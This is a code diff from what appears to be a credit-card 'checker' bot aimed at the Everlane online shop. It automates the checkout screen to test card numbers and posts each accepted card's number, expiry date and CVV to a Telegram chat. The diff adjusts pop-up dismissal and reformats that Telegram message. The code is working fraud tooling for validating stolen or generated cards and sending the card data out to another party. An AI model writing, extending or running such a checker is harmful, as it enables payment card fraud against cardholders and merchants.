@@ -37,7 +37,9 @@ def preparar_worksplace():
         bot.pause(5)
 
         if bot.locate('get_early_access', click=False):
-            bot.locate('no_thanks')
+            bot.locate('no_thanks') or bot.locate('quit')
+        elif bot.locate('get_10_off', click=False):
+            bot.locate('no_tanks') or bot.locate('quit')
 
         bot.locate('sock', check=True, click=False)
         bot.scroll(-200)
@@ -186,15 +188,7 @@ def livear(cc_namso):
     if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
         print(f'CC: {cc} - Live!')
 
-        content = f"""
-        Everlane Checker: 
-        
-        📬 STATUS: LIVE! ✅
-
-        CC: {cc[0]}
-        EXP: {cc[1]}/{cc[2]}
-        CVV: {cc[3]}
-        """
+        content = f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE!\n\n✅CC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}"
 
         telegram(content, '-726102881')
         bot.press_both('ctrl', 'l')
